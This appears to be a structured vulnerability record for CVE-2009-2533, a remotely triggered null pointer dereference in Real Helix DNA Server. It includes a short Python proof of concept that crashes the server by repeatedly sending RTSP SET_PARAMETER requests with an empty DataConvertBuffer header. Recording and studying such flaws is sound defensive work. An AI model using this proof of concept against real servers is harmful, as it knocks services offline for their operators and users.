  "cve": "CVE-2009-2533",
  "description": "The provided content details a vulnerability in Real Helix DNA server related to handling of RTSP (SET_PARAMETER) requests. Specifically, when the 'DataConvertBuffer' parameter is empty, the server attempts to read from memory address 0, triggering an exception. While the server handles the exception initially, sending multiple such requests in short succession leads to the server becoming unresponsive and eventually terminating execution.",
  "vulnerability_details": {
    "root_cause": "The vulnerability stems from improper handling of the 'DataConvertBuffer' parameter in RTSP SET_PARAMETER requests. When this parameter is empty, the server attempts to dereference a null pointer, specifically address 0, leading to an access violation.",
    "weaknesses": [
      "Null pointer dereference",
      "Lack of input validation for the 'DataConvertBuffer' parameter"
    ],
    "impact": "Denial of service (DoS). The server becomes unresponsive and terminates.",
    "attack_vector": "Remote. An attacker can send specially crafted RTSP requests over a network connection.",
     "attacker_capabilities": "The attacker needs to be able to establish a network connection with the vulnerable server and send RTSP requests."

  "poc": {
    "code": "import socket\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('172.16.132.133',554))\n\nsetRequest = \"SET_PARAMETER / RTSP/1.0\\r\\n\"\nsetRequest +=\"DataConvertBuffer: \\r\\n\\r\\n\"\n\nfor i in range(5):\n  print i\n  s.send(setRequest)\n\ns.close()",
    "description": "The provided Python code demonstrates sending multiple malformed 'SET_PARAMETER' requests with an empty 'DataConvertBuffer' to the target server, causing the denial-of-service condition."
